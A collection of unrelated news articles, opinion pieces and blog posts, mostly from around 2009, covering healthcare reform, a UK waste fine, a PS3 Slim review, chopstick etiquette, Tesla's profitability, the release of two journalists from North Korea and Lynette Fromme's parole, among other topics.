Newt Gingrich says nothing new in his Aug. 16 Times Op - Ed article , “ Healthcare rationing : Real scary . ”
Gingrich presents the same old litany of scare tactics that we ’ve heard in the past : government bureaucracies run amok and limited choices resulting in rationed healthcare .
Gingrich ’s doomsday prophecies are simply not consistent with the facts .
Every healthcare consumer in this nation ( that ’s all of us ) has a substantial stake in the success of reform .
If we fail to pass the reform legislation , we will continue on our current downward financial spiral , and our fragmented healthcare system will ultimately collapse under the weight of increasing costs .
Do n’t think for a minute that stopping reform is good for America .
It ’s like deciding that a serious disease will get better if we ignore or fail to treat it -- even if the required treatment is painful .
Debates about healthcare reform are nothing new ; they ’ve been going on since the Truman administration .
Previous attempts to fix our healthcare system have failed largely because of lobbying and political maneuvering by various special interest groups , including doctors , hospitals and the insurance and pharmaceutical industries .
The groups that have killed reform in the past have one thing in common :
None have put the care and treatment of patients first .
Now there is a possibility for real progress and change .
Just as a disease that is ignored or denied is more resistant to treatment as time goes on , failure to reform our healthcare system will make controlling costs more difficult in the future .
Yet Gingrich would rather fight the same old partisan political battles instead of ensuring that we finally guarantee the right of affordable , quality healthcare to every American .
I also find it distressing that Gingrich distorts the scholarly work of Dr. Ezekiel Emanuel , brother of White House Chief of Staff Rahm Emanuel .
I know Dr. Emanuel .
I trust Dr. Emanuel .
He is no Dr. Death , as Gingrich insinuates .
He is a respected oncologist and bioethicist who cares deeply about the welfare of families and patients .
Those interested in finding out Emanuel ’s true position on end - of - life healthcare should click here to read the full text of a column he wrote for the Atlantic in 1997 , more than a decade before the current healthcare debate .
Gingrich writes that the critical test of any reform package is whether it will “ empower individuals or impose on them . ”
I agree , but let ’s have a reality check here : Failure to reform healthcare in the past has imposed huge financial burdens on every U.S. taxpayer .
Rising healthcare costs are the reason why incomes in the U.S. have n’t kept up with the cost of living .
Moreover , without reform , out - of - control spending in the future will destroy much of the quality healthcare we now cherish .
Today , healthcare spending accounts for about 17 % of the U.S. gross domestic product ; by 2018 , that figure is projected be around 21 % .
Without action now , healthcare spending could account for the whole GDP before the end of this century .
Let ’s face it :
We ’re on the verge of substantial reform , and it ’s fair to raise questions about exactly where we ’re headed .
But beware of attempts to derail progress with scare tactics .
We would n’t scare a sick patient out of receiving lifesaving treatment merely because it is challenging or even painful ; the same should be true for our healthcare system .
Our nation has backed away from healthcare reform before , and we ’re worse for it .
We ca n’t let it happen again .
I ’ll close with a scare tactic that ’s actually grounded in truth : Doing nothing is the worst option .
Philip Pizzo is dean of the Stanford University School of Medicine .
A SHOPKEEPER has been fined £ 180 by Southend Council for NOT producing commercial rubbish .
Mark Howard , 50 , owner of Sutton Cycles in Sutton Road , Southend , has recycled all the cardboard boxes his new bikes arrive in by using them when he sells second - hand bikes .
He only has a small amount of cardboard left , which he takes home for bedding for chickens .
Mr Howard was astonished when a council official visited to check his waste disposal credentials .
The officer refused to believe he did not produce any waste and he was issued with a £ 180 fixed penalty notice , which if he does n’t pay within ten days , will be increased to £ 300 .
If he fails to pay that he will face court proceedings .
The father of four , who lives with his wife Karen in Archer Avenue , Southend , said : “ The council does n’t provide a recycling service for businesses .
You have to pay private companies a lot to do that and there are none round here that I know of . ”
Most businesses are given a certificate from council waste contractor Cory when they pay for waste bags or have theirbins removed .
But as Mr Howard did not use the service , he could not produce one .
Mr Howard said he will refuse to pay the fine unless the council proves he has done something wrong .
Steven Crowther , group manager for waste at Southend Council , said Mr Howard was required to produce evidence of how he disposes of commercial waste .
What models of marijuana legalization are best or most likely ?
I thought it would be interesting to get the views of readers on different models of marijuana legalization ( note : this is marijuana legalization only — we ’ll explore other drugs in later polls ) .
The first poll is for your ideal model :
[ polldaddy poll=1913597 ]
Second poll ( same responses , but different question ) is for what you think will actually happen in the next 10 years :
[ polldaddy poll=1913638 ]
Edit : Is anybody using Internet Explorer ?
If so , are you able to see the comments below ( there ’s at least 20 of them ) ?
I ’ve heard from someone who ’s having problems – perhaps an issue with the polls and IE .

As 2009 comes to a close , the most dangerous jobs list has arrived from the Bureau of Labor Statistics ( BLS ) .
You may find yourself rethinking your career choice after reading this , especially since you are not only putting your life at risk .
The jobs on the list are n't the highest paying jobs .
Plus , many of them do n't offer you the greatest benefits if you are hurt or killed on the job .
You may want to reconsider your career from a cost - benefit analysis perspective .
Without any further ado , here is the list of the 10 most dangerous jobs for 2009 :
10 . Cops / Law Enforcement
Cops risk their lives every day .
Being a policeman is even more dangerous today than it has been in the past .
Our policemen have to deal with gangs , mafia , criminals , and other individuals that break our laws .
The job can be especially dangerous when there is a territorial dispute between two street gangs .
Law Enforcement is a dangerous profession , but , luckily , individuals still choose it and keep us safe in the process .
9. Truck Drivers
Being a truck driver is one of the most dangerous jobs in America and it ’s held by thousands of Americans .
Truck drivers have really tight time constraints for pick - ups and deliveries that they have to meet .
This means that they travel fast , sometimes getting little sleep , and they must deal with traffic and weather which can put them really far behind .
They are even limited on the breaks that they take .
They spend their days on the highways carrying heavy loads , trying to make it to the next stop on time .
Naturally , this puts them at risk of accidents from fatigue and other factors .
8. Electrical Repairs
Electrical workers are always trying to fix power lines .
This means that they work day or night , rain or shine .
The combination of water and high voltage power lines mean a higher likelihood that things will go wrong .
They face the constant risk of falling and electrocution .
Electricians always have to be on guard , making sure that they only touch certain wires and avoid other wires .
7. Roofing
Roofers ’ safety is mainly in jeopardy because they act like tough guys and do n't harness themselves in .
They spend a lot of time putting shingles on and repairing roofs in all sorts of conditions whether it 's rain or snow .
In these circumstances , roofers have a very high chance of falling .
6. Farmers and Ranchers
Not only do farmers have to deal with animals , but also with machines and Mother Nature .
They are the reason that the rest of us are able to survive .
Farmers must always be aware so they are n't kicked in the head by an animal or have some piece of machinery injure them .
Not long ago , a wildfire killed some farmers were killed in a wildfire while they were trying to gather their cattle .
These are just some of the reasons why farming and ranching are so difficult and ultimately dangerous .
5. Pilots
Pilots are not only responsible for themselves but also for the passengers that they carry and whatever they hit in the event of a crash .
They fly public airlines , corporate jets , private planes , crop dusters , and more .
They not only have to deal with the aspect of flying a plane , but also Mother Nature and faulty parts .
Which were factors for the Air France flight that went down off the coast of Brazil .
4. Iron and Steel Workers
These workers have to mold , set , and handle metal construction materials .
They build bridges and skyscrapers and have a job that requires them to spend a lot of their time above the ground .
If they fall they are in serious trouble .
Plus they have to be exceptionally careful because if beams fall on them they can be killed or paralyzed , which may result in them never returning to work .
3. Military
For obvious reasons , military personnel have a very risky job .
Soldiers are thrown into conflict equipped with guns , tanks , grenades , bombs , and lots of other weapons in order to try and stop a conflict or take something over .
There are always people out to get them so they have to protect themselves and quell opposition .
Either way , when you have men and women fully armed , there are bound to be casualties and fatalities .
2. Logging
Unless you have seen " American Loggers " on TV , you may not have realized how dangerous it really is .
They work at high altitudes , sometimes on the sides of mountains , removing trees .
If they are n't harnessed in properly or paying attention to their surroundings , they may not survive to see nightfall .
Logging is a science .
If the tree goes down a different way than you expected , you may never be cutting wood again .
Once the tree is down though , the danger is n't over .
The men need to always be sober because , even if they have already cut down the trees , they still have to get the trees off the mountain .
1. Fishing
Being a professional fisherman may seem like something that would be relaxing but the TV show " Deadliest Catch " proves otherwise .
This is the most deadly profession of 2009 .
These men go out for weeks at a time and have to face Mother Nature and the ocean .
In 2008 , the Labor Department reported 50 deaths out of 39,000 .
This boils down to 128.9 per 100,000 full - time workers dying .
Rough seas , unpredictable weather , and isolation during emergencies make this job very dangerous .
While these jobs may be dangerous , they are also very rewarding .
They offer individuals an exciting job that is n't routine .
They have to always be aware of their surroundings and stay alert .
Otherwise , their life may be on the line .
These jobs are also very physical and allow workers the ability to get outside and see and do different things .
While these jobs are rewarding , individuals would be wise to consider other options .
When programmers interview for a job here , we ask that they spend a week with us , and we pair them with as many people as possible .
Besides checking their skill level , we want to see if we could all work side by side with them for weeks at a time and if they ’re a fit with the company .
It gives them a chance to check us out , too .
Our programmers exhibit idiosyncrasies that might be found in any workplace , such as one person leaving a work area messy , and the germaphobe who disinfects everything .
On certain days , people may not be the best partners , like the day I was preoccupied because my dog was at the vet .
If that occurs , the other person can usually snap their partner back to center line .
People working so close have occasional personal conflicts , too .
Hashrocket provides our workspace , office furniture , mouse pads and anything else we need , but we use our own laptops .
Once two of our programmers had a falling out over a keyboard function .
The navigator wanted to remap the caps lock key as a control key for when they switched roles .
But it was the driver ’s laptop , and he did n’t like that idea .
When the driver went to the restroom , the navigator changed the key anyway , and the two had a disagreement .
They came to terms when the navigator agreed that the person who owns the laptop gets to decide the computer key function .
The ability to pair program all the time was a selling point for my taking this job .
Previously , I worked for an I.T. group at a government agency in another state .
I tried to get buy - in for pair programming there , but we were allowed to do it only occasionally because of the perceived drawbacks .
State governments have tight budgets , so it was a hard sell .
Some people can’t believe it saves money for two people to do a job one person can do .
THIS style of programming all day every day is exhausting , but it makes me more disciplined .
It ’s easy for a programmer working alone to give in to distractions  to check e-mail , Twitter or Facebook , for example  when confronted with a problem .
We ’re on social media a lot anyway , because we need to stay current , but many people take five - minute breaks every half hour , and that ’s the recommended time for accessing Twitter or the Internet .
That schedule of working 25 minutes and then taking a 5 - minute break is a time management technique called Pomodoro , which means “ tomato ” in Italian .
Every once in a while a programmer wo n’t stop after 25 minutes and we ’ll hear someone say , “ Respect the tomato . ”
Editors ' note :
In November of 2009 , Sony introduced Netflix to the PlayStation 3 home console .
Netflix subscribers can order a free PS3 Netflix Blu-ray Disc online from the site and must use it every time in order to stream a movie .
Users can manage their queue and watch any film that 's available ( including some HD content ) for instant viewing .
Please see our hands - on review of the Netflix PS3 service .
Back in 2004 , four years after first launching the PlayStation 2 , Sony brought out a new , much more compact PS2 .
Timed to come out just as Grand Theft Auto : San Andreas was hitting stores , the redesigned console helped breath new life into the PS2 franchise .
It remains on store shelves today - - you can pick one up for just $ 99 .
Needless to say , Sony hopes that a trimmed down -- and less expensive -- PS3 Slim will similarly invigorate sales of the PlayStation 3 , which has lagged behind the Nintendo Wii and the Microsoft Xbox 360 and has taken some of the luster off the PlayStation brand ( even as earlier versions of the PS3 received high marks from this publication ) .
To many industry observers , the Slim PS3 represents a moment of reckoning for the PS3 - - a chance at redemption if you will -- and clearly some serious engineering has gone into the creation of Sony 's latest black gaming box and media player .
Versions
For the 2010 holiday season , Sony will be offering two main models of the PlayStation 3 system , which we 've outlined below .
Also included is the 250GB PlayStation 3 that is usually offered by specific retailers and will occasionally include a game or accessory pack - in .
The most notable difference between all of these models is the internal - hard - drive capacity .
PlayStation 3 Slim ( 160GB ) : This Slim model effectively replaces the original 120 GB Slim PlayStation 3 and will be sold side by side the 320 GB PlayStation 3 Move Bundle for $ 300 .
PlayStation 3 Move Bundle ( 320 GB ) : Priced at $ 400 , the PlayStation 3 Move Bundle includes a PS3 with a 320 GB hard drive , a PlayStation Eye camera , a PlayStation Move controller , and a copy of Sports Champions .
PlayStation 3 Slim ( 250GB ) : Usually sold with a packed - in accessory or game , the 250GB PlayStation 3 is only available at certain stores .
Design and features
If you 're a fan of the PS3 or have been sitting on the fence , waiting for its price to drop to $ 299 , the good news is that from a features standpoint , the 120 GB Slim PS3 is nearly identical to the 80GB and the 160GB " fat " PS3 models that Sony 's in the process of phasing out .
Aside from losing the capability to install another OS ( Linux ) on your PS3 , nothing much else has changed .
You still get built - in Wi-Fi connectivity ( the Xbox 360 Wi-Fi adapter is a $ 100 add - on accessory ) , two USB ports for plugging in external storage devices and charging the PS3's Bluetooth wireless controller ( one DualShock 3 controller comes with the Slim ) , and the same built - in Profile 2.0 Blu-ray player with BD - Live capabilities .
Like its predecessor , the Slim also supports playback of MPEG - 1 , MPEG - 2 , and MPEG - 4/h.264 video files from USB or disc - based media , as well as JPEG image viewing ( the slideshow functionality is quite impressive ) .
Like the Xbox 360 , the PS3 can act as a digital media hub , with the ability to stream content from any DLNA - compatible network device , including PCs and network attached hard drives .
And you also get a built - in Web browser ( optional Bluetooth keyboards are available ) , which is serviceable , though not as good as any of the major browsers available for PCs .
Around back , you 'll find an Ethernet jack , an HDMI output ( no cable included ) , an optical digital audio output ( SPDIF ) , and the proprietary PlayStation AV output for analog audio and video .
A composite AV cable ships with the unit , and because it uses the same connector as the PlayStation 2 , that system 's S - Video and component cables should work with it , as well ( to get HD video , you 'll need component or HDMI ) .
The bad news is that Sony did n't add new features to the Slim .
Alas , while we did n't think the company would be nice enough to throw in an IR receiver so you could control the PS3 with a standard IR universal remote , Sony has eschewed IR again .
Also , if you 're pining to play your collection of PS2 games on Slim , you 'll be disappointed to note that backward capability remains a thing of the past ( the option only existed only on some of the earlier PS3 systems Sony released ) .
The story here , then , is all about design , and it 's generally a good one .
For starters , the Slim is 33 percent smaller and 36 percent lighter than its predecessors , and it really does look significantly more compact when you put it up against the " fat " PS3 .
Beauty , of course , is in the eye of the beholder , and many people , including this reviewer , think the Slim 's new frame is fairly fetching .
Yet , we 've also heard people say that the new " textured , " or matte , finish gives the system a cheaper look .
Maybe so , but pick the Slim up and it feels quite substantial .
And while we 're sure Sony does n't want people referring to the Slim using adjectives like cheap ( except when it comes to the price tag ) , the company does want this PS3 to appear more " casual " and appeal to a wider audience ( read : casual gamers ) .
Chopsticks are eating utensils that are a pair of small , tapered sticks that are used as the traditional eating utensils of Japan ,
China , Vietnam , Korea , and Taiwan .
It ’s thought that they originated in ancient China and then spread throughout Asia .
The most common materials used to make chopsticks are bamboo or plastic , but you can also find ones made of metal , ivory , bone , and several different types of wood .
I ’ve got two different videos here that both show you
how to use chopsticks –I like having multiple videos teaching the same thing , IF they ’re both good , because when you ’re trying to learn something seeing two different teaching perspectives can really help , plus the first one is aimed at using chopsticks the Chinese way and teaches some Chinese chopstick etiquette and the second one is aimed at using chopsticks the Japanese way and teaches some Japanese etiquette .
Grab your chopsticks and have a look ( do it the Karate Kid way : when you can catch a fly with your chopsticks , you are ready to eat out at Asian restaurants without fear of embarrassing yourself ) :
How to use chopsticks the Chinese way
Some additional notes on Chinese chopstick etiquette :
It ’s considered acceptable ( and a polite gesture ) to transfer food to close relatives ( e.g. grandparents , parents , spouse , children , etc. ) who are having difficulty picking up their food .
Also , it is a sign of respect to pass food to any elderly people at the table first before everyone else .
Do n’t tap chopsticks on the edge of your bowl : beggars do this to attract attention .
Do n’t point rested chopsticks towards other people who are seated at the table .
How to use chopsticks the Japanese way
Some additional notes on Japanese chopstick etiquette
Do n’t transfer food from your chopsticks to someone else ’s chopsticks .
Japanese people will always offer or pass their plate to transfer food .
Transferring directly is how bones are passed as part of Japanese funeral rites .
Place the pointed ends of your chopsticks on a chopstick rest when they ’re not being used .
However , when a chopstick rest is not available , as is usually the case in most restaurants ( which use ‘ waribashi ’ : disposable chopsticks ) , what you can do is make one by folding the paper case that contained the chopsticks into an improvised sort of rest , like this :
Do n’t cross your chopsticks on the table , as this symbolizes death , or vertically stick them in the rice , which is done during a funeral .
As with the Chinese , the Japanese consider it rude to rub wooden chopsticks together after breaking them apart , because this says to the host that you think the chopsticks are cheap .
Do n’t hold the chopsticks in your mouth while you do something else like pick up a bowl or plate .
Do n’t use unmatched chopsticks .
Do n’t wash your chopsticks off in your soup or beverage .
Do n’t use chopsticks as hair accessories .
Everyone has seen photos of kimono - clad Japanese models and geishas with what appear to be pretty chopsticks in their hair .
Those are not chopsticks , they are hair ornaments called kanzashi .
Chopsticks are exclusively for use with your food .

You might think machine learning and artificial intelligence are straight out of a science fiction movie .
However , you might be surprised to learn the applications of machine learning in your day to day life .
You most likely benefit from it daily , without even realizing it .
What is machine learning ?
Simply , it is a form of artificial intelligence in which machines learn without being specifically programmed .
It ’s cutting edge , fascinating , and improving the lives of all of us .
Read on to learn the top five ways that machine learning impacts our day to day life , at home , in the workplace , and in our leisure time .
1. Automated Transportation
We all know driverless cars are under development , although they are n’t quite part of our everyday life yet .
We do know they will be a big part of the future of machine learning though and it will be exciting to watch it happen .
However , many other forms of transportation are either completely or partially automated , thanks to the benefits of machine learning .
If you ’ve flown on a commercial aircraft lately , then you ’ve benefited from machine learning .
Modern airplane flight is largely automated , using a flight management system that uses computers , motion sensors , and GPS to keep track of location in the air .
In major cities , we often ride driverless public transportation , such as subway or metro cars .
Even with no driver or staff members on board , machine learning can control the logistics of public transportation , keeping to timetables and automatically starting and stopping .
It is completely safe , reliable , and gives our cities additional public transport options .
2. Smart Homes
Smart home technology is a huge benefit of artificial intelligence in everyday life .
They allow us to monitor , control , and enjoy our homes like never before .
What is a smart home ?
Smart homes are homes that are built or operated using automation and controls to operate the home .
Tasks that were traditionally done physically in person , such as turning on the oven or switching off the lights , can now be done by technology , from anywhere in the world .
Smart homes are controlled via machine learning , and allow us to do a lot of amazing things in the home , or via remote access from our smartphones .
You can turn off and on lights , open and close the garage door , unlock the front door to let in a neighbor , or access and monitor a security system .
Though a home hub , such as Google Home Nest or Amazon Alexa , control all of the features of your home and enjoy the innovation and convenience of a smart home .
They can add a lot of safety features to your home and cameras and microphones let you keep an eye on your kids , pets , or loved ones while they are in the house and you ’re elsewhere .
3. Digital Assistants
If you ’ve used Siri or Alexa on your phone to ask for directions , then you ’re aware of the amazing uses of having a digital assistant in your pocket .
Digital assistants are powered by machine learning and are continuously learning our preferences , location , and schedules to customize their services to us .
This technology is great for asking the time , finding a restaurant , or checking movie times , but they are also fantastic in the business sector .
They are not only on our phones but can be found on fitness trackers , GPS systems , laptops , and integrated with our smart home systems , so you ’re never caught out without your trusted assistant .
Remote machine learning has a lot of advantages for your business , including data modeling and improving the client experience .
4. Online Customer Support
Have you ever engaged with a business or a social media account via a chatbot ?
Often , when we contact a business online via their online support , your first interaction will be via a chatbot , powered by machine learning .
By analyzing the answers to your questions , the online support can tailor their replies or forward your query to the appropriate customer support person .
Unlike traditional customer service , chatbots operate 24/7 and are always available to answer your questions .
This is also seen in e-commerce stores , as machine learning can be used for businesses to show you ads online , based on the websites you ’ve visited recently .
Whether you find this beneficial or annoying , there ’s no doubt that machine learning plays a huge role in customer support and marketing of online businesses .
5. Fraud Detection
Bank fraud is a consumer ’s worst nightmare .
Whether your wallet and bank cards have been physically stolen or if your online banking details have been compromised , there ’s nothing worse than finding out that a criminal has made charges from your credit card or bank account .
However , the good news is that , should this happen , you are likely to receive a notification , such as a phone call or text message from your bank .
They can instantly notify you that fraudulent activity has been noticed .
How is this done ?
Via machine learning !
Your bank is constantly monitoring your bank account use — where you make purchases , what time of day , and frequency of use .
As soon as an unusual transaction occurs , the bank ’s machine learning triggers an alert .
This lets you cancel your cards instantly , stopping any further use .
Sometimes , if you are interstate or happen to make an out - of - the - ordinary purchase , you may receive the same notice from your bank .
Even if it was in error , fraud detection is a fantastic reassurance for peace of mind when using your bank account .
Convinced of the Applications of Machine Learning ?
Are you surprised by all of the daily benefits of artificial intelligence ?
As they say , the future is now , and the benefits from the applications of machine learning are all around us .
Machine learning is an incredible tool that is making our lives safer , helping us connect with others , and improving accuracy and efficiency in businesses and websites .
Once you stop to look for it , you ’ll find that machine learning is all around you .

On August 7th , Silicon Valley - based Tesla Motors announced that they have achieved profitability , something CEO Elon Musk had previously predicted would happen .
In the month of July they had $ 1 million of earnings on revenue of $ 20 million .
In the same month they delivered 109 Roadsters , the most ever in a single month , continued development work on the upcoming model S sedan , and expanded their retail network operations .
“ We achieved a bottom - line profitability thanks to a tremendous amount of hard work by the Tesla team to improve quality , while simultaneously reducing costs on the Roadster , ” said Tesla CEO Elon Musk .
“ This also shows that there is strong demand for a car that is unique in offering high performance with a clean conscience .
Moreover , customers know that in buying the Roadster they are helping fund development of our mass market electric cars . ”
In June , the company was awarded $ 465 million in low cost government loans to be used for Model S production .
A requirement for the loans was that the company be viable , something they have now officially proven .

Eileen T. Kennedy , president of the Smart Choices board and the dean of the Friedman School of Nutrition Science and Policy at Tufts University , said the program ’s criteria were based on government dietary guidelines and widely accepted nutritional standards .
Image Foods with the Smart Choices checkmark include sugar - laden cereals like Froot Loops , mayonnaise and Fudgsicle bars .
Credit ... G. Paul Burnett / The New York Times
She said the program was also influenced by research into consumer behavior .
That research showed that , while shoppers wanted more information , they did not want to hear negative messages or feel their choices were being dictated to them .
“ The checkmark means the food item is a ‘ better for you ’ product , as opposed to having an x on it saying ‘ Do n’t eat this , ’ ” Dr. Kennedy said .
“ Consumers are smart enough to deduce that if it does n’t have the checkmark , by implication it ’s not a ‘ better for you ’ product .
They want to have a choice .
They do n’t want to be told ‘ You must do this . ’ ”
Dr. Kennedy , who is not paid for her work on the program , defended the products endorsed by the program , including sweet cereals .
She said Froot Loops was better than other things parents could choose for their children .
“ You ’re rushing around , you ’re trying to think about healthy eating for your kids and you have a choice between a doughnut and a cereal , ” Dr. Kennedy said , evoking a hypothetical parent in the supermarket .
“ So Froot Loops is a better choice . ”
Froot Loops qualifies for the label because it meets standards set by the Smart Choices Program for fiber and Vitamins A and C , and because it does not exceed limits on fat , sodium and sugar .
It contains the maximum amount of sugar allowed under the program for cereals , 12 grams per serving , which in the case of Froot Loops is 41 percent of the product , measured by weight .
That is more sugar than in many popular brands of cookies .
“ Froot Loops is an excellent source of many essential vitamins and minerals and it is also a good source of fiber with only 12 grams of sugar , ” said Celeste A. Clark , senior vice president of global nutrition for Kellogg ’s , which makes Froot Loops .
“ You cannot judge the nutritional merits of a food product based on one ingredient . ”

A 28 - year - old man was arrested on Wednesday for attempted murder and obstructing police in the line of duty , after the Osaka District Public Prosecutors ’
Office decided earlier in the day not to charge him for the time being on accusations he held a 19 - year - old girl against her will in his apartment and breaking the Swords and Firearms Control Law on July 22 .
Police in Ibaraki City in north Osaka rushed to Naoya Iwata ’s apartment on the night of July 22 , following a call from his neighbor that she could hear a girl screaming for help .
Three officers arrived at the scene and asked him where the girl was , but he told them he did n’t know anything about it and that he was watching a video .
Police began searching his apartment and found a 19 - year - old girl unconscious with her wrists bound together in a storage space about 60 cm wide and 50 cm deep , underneath the flooring .
Iwata is accused of then putting a sword to an officer 's neck , and the other two officers drew their guns and asked him to put the sword down .
Thirty minutes passed before five other officers stormed the room from the balcony and Iwata was arrested .
One of the officers sustained a serious cut to his right leg in the incident , expected at the time to take up to two months to heal .
The girl was taken to a hospital where she recovered and received treatment for the bone fractures around her eye .
Iwata told police that he had met her for the first time several hours earlier after becoming acquainted via a cell phone website .
The Osaka District Public Prosecutors ’
Office determined on Wednesday not to charge Iwata as of yet for illegal confinement and violating the Swords and Firearms Control Law , and he became eligible for release given the maximum period of detention expired that day .
Iwata was subsequently arrested for attempted murder and interfering with an officer in the line of duty .
He has denied intending to kill the officer .
The District Prosecutor ’s Office is expected to deal with all of the charges at the same time in the near future .

BURBANK , California ( CNN ) -- Laura Ling on Wednesday expressed the shock she and Euna Lee felt when former President Clinton showed up in Pyongyang , North Korea , to help secure the two journalists ' release .
The families of Euna Lee , left , and Laura Ling greet them Wednesday in California .

" We feared at any moment that we could be sent to a hard labor camp , and then suddenly we were told we were going to a meeting , " a tearful and emotional Ling said at a news conference Wednesday morning in California shortly after arriving by plane with Lee and Clinton .
She spoke minutes after the two women were reunited with their families at Bob Hope Airport in Burbank outside Los Angeles .
They had been detained in North Korea since March .
North Korea pardoned Ling , 32 , and Lee , 36 , after Clinton 's brief trip Tuesday to Pyongyang .
" We were taken to a location , and when we walked through the doors , we saw standing before us President Bill Clinton , " Ling said , with Lee standing beside her .
Watch the emotional return at the airport »
" We were shocked , but we knew instantly in our hearts that the nightmare of our lives was finally coming to an end . "
She expressed her and Lee's " deepest gratitude " to Clinton and his " wonderful , amazing " team .
Watch as Ling says , " We could feel your love " »
" The past 140 days have been the most difficult , heart - wrenching time of our lives , " Ling said .
" We are very grateful that we were granted amnesty by the government of North Korea , and we are so happy to be home . "
She said that she and Lee are looking forward to spending " some quiet , private time " with their families .

Former Vice President Al Gore also spoke to the throngs of journalists at the news conference .
He expressed his gratitude to Clinton and President Obama and his administration who " have been deeply involved in this humanitarian effort . "
Watch Gore pay tribute to the people involved in the effort »
Lee and Ling are employed by Gore 's California - based media company , Current TV .
The women were arrested in March while reporting from the border between North Korea and China .
In June , they were sentenced to 12 years of hard labor on charges of entering the country illegally to conduct a smear campaign .
On Wednesday morning , Lee bowed as she walked down the steps of the plane into a private hangar , and Ling raised her fists into the air .
The women hugged their families , who were waiting at the bottom of the stairs .
Lee 's 4 - year - old daughter , Hana , clung tightly to her tearful mother .
Watch as the women reunite with their families »
Clinton walked off the plane minutes later but did not address the crowd .
" I am very happy that after this long ordeal , Laura Ling and Euna Lee are now home and reunited with their loved ones , " Clinton said in a statement .
" When their families , Vice President Gore and the White House asked that I undertake this humanitarian mission , I agreed .
I share a deep sense of relief with Laura and Euna and their families that they are safely home . "
Journalist Lisa
Ling said she never gave up hope that she would see her sister again .
" We always maintained our hope and knew in our hearts that we would see Laura again ; we just did n't know when , " Lisa Ling said outside her home in Los Angeles , California .
" We are just thrilled beyond words that the day has finally arrived . "
She said her sister was looking forward to eating fresh fruit and food for the first time in four months , after many meals of rice that often contained rocks .
" I can tell she has gone through a lot , " Ling said .
" My sister has an amazing , amazing spirit , and she 's a little bit weak right now , so I think it 's going take a little time for her to gather up her wits and be able to talk about what she experienced . "
At the White House , Obama applauded the release of the two journalists , saying , " We are very pleased with the outcome . "
Their release is a " source of happiness not only for the families but for the entire country , " he said .
Watch as Obama says , " We are relieved " »
Obama also thanked the former president and Gore for their roles in winning the women 's release .
" I think that not only is this White House ... extraordinarily happy , but all Americans should be grateful to both former President Clinton and Vice President Gore for their extraordinary work , " he said .
Clinton made the trip to North Korea after the women 's families asked him to travel there , a senior administration official said .
Doug Ling , Ling 's father , earlier reacted to the news of his daughter 's release outside his home in Carmichael , California , saying it was " one of the best days in my life . "
" I figured , sooner or later , they'd be back , " he said .
U.S. Secretary of State Hillary Clinton also expressed her relief that the two women were released .
She spoke from Nairobi , Kenya , where she is taking part in a multination visit to Africa .
" I spoke to my husband on the airplane , and everything went well , " she said .
" It is just a good day to be able to see this happen . "
In July , Ling and Lee spoke to their families and told them that the North Koreans were willing to grant them amnesty if a high - level envoy , such as former President Clinton , were willing to travel to Pyongyang , the administration official said on condition of anonymity .
North Korea said Clinton " expressed words of sincere apology to Kim Jong Il " for the journalists ' actions , but the administration official said he knew nothing about an apology .
He said Clinton met for three hours and 15 minutes with the North Korean leader but said he did not know what issues were discussed .
But he said Clinton 's views on a verifiable denuclearization of the Korean Peninsula are well - known .
North Korea 's state - run Korea Central News Agency said Clinton conveyed a message from Obama " expressing profound thanks for this and reflecting views on ways of improving the relations between the two countries . "
But White House spokesman Robert Gibbs said before the announced agreement that Clinton was not carrying any message from Obama .
Gibbs added the former president last spoke with Obama during a White House visit in March .
He described Clinton 's trip as a " solely private mission to secure the release of two Americans . "
Clinton 's mission came as the United States and its allies in the region are seeking to persuade North Korea to return to the stalled nuclear disarmament talks .
North Korea conducted its second nuclear bomb test in May and has held several missile tests since then .
The United Nations has responded by increasing sanctions on the nation .
North Korea and the United States had no regular contacts before a 1994 crisis over Pyongyang 's nuclear program .
North Korea agreed then to halt the development of nuclear weapons but abandoned that accord and withdrew from the Nuclear Non-Proliferation Treaty in 2003 .
Clinton had considered visiting North Korea in 2000 , near the end of his second term as president .
His secretary of state , Madeleine Albright , had gone to Pyongyang in 2000 to meet with Kim .
She was the last high - ranking American official to do so before this week .
CNN 's Elaine Quijano , Charlie Moore and Ninette Sosa contributed to this report .

( CNN ) --
The president she once pointed a gun at has been dead for nearly three years , and her longtime idol and leader , Charles Manson , remains in prison .
Lynnette " Squeaky " Fromme appears in court in Los Angeles , California , in December 1969 .
However , Lynette " Squeaky " Fromme is about to get her first taste of real freedom in more than three decades .
According to the Federal Bureau of Prisons , Fromme , now 60 , is set to be released on parole August 16 .
Fromme is housed at Federal Medical Center Carswell in Fort Worth , Texas .
For years , she was one of Manson 's few remaining followers , as many other " Manson Family " members have shunned him .
A prison spokeswoman would not say whether Fromme continues to correspond with Manson .
Fromme was convicted in 1975 of pointing a gun at then - President Gerald Ford in Sacramento , California .
Secret Service agents prevented her from firing , but the gun was later found to have no bullet in the chamber , although it contained a clip of ammunition .
In a 1987 interview with CNN affiliate WCHS , Fromme , then housed in West Virginia , recalled the president " had his hands out and was waving ... and he looked like cardboard to me .
But at the same time , I had ejected the bullet in my apartment and I used the gun as it was . "
She said she knew Ford was in town and near her , " and I said , ' I gotta go and talk to him , ' and then I thought , ' That 's foolish .
He 's not going to stop and talk to you . '
People have already shown you can lay blood in front of them and they 're not , you know , they do n't think anything of it .
I said , ' Maybe I 'll take the gun , ' and I thought , ' I have to do this .
This is the time . ' "
She said it never occurred to her that she could wind up in prison .
Asked whether she had any regrets , Fromme said , " No . No , I do n't .
I feel it was fate . "
However , she said she thought that her incarceration was " unnecessary " and that she could n't see herself repeating her offense .
" My argument to the jury was , if she wanted to kill him , she would have shot him , " John Virga , a Sacramento attorney appointed to defend Fromme , told CNN on Tuesday .
" She 'd been around guns .
And let 's be realistic :
We know the Manson family , at least some of them , are killers . "
Fromme was sentenced to life in prison , but parole was an option at the time , although the federal system later abolished it , said Felicia Ponce , spokeswoman for the Bureau of Prisons .
Inmates do receive " good time " -- for every year and one day they serve , Ponce said , 54 days are lopped off their sentence .
Fromme became eligible for parole in 1985 , Ponce said .
According to reports , she for years waived her right to a parole hearing .
The Bureau of Prisons would not say whether she changed her mind and requested a hearing , but the U.S. Parole Commission 's
Web site says that everyone who wishes to be considered for parole , except those committed under juvenile delinquency procedures , must complete a parole application .
Federal inmates serving life are generally paroled after 30 years , unless the parole commission decides to block the release , according to a commission spokesman .
Inmates who are paroled remain under supervision until the commission decides to terminate the sentence .
Fromme was not granted parole until July 2008 , Ponce said .
She was not released then , however , because of extra time added to her sentence for a 1987 escape from the West Virginia prison , which occurred after her interview that same year .
She was found two days later , only a few miles from the prison .
At the time , prison officials said they were looking into rumors that Fromme escaped after hearing Manson was ill , according to news reports .
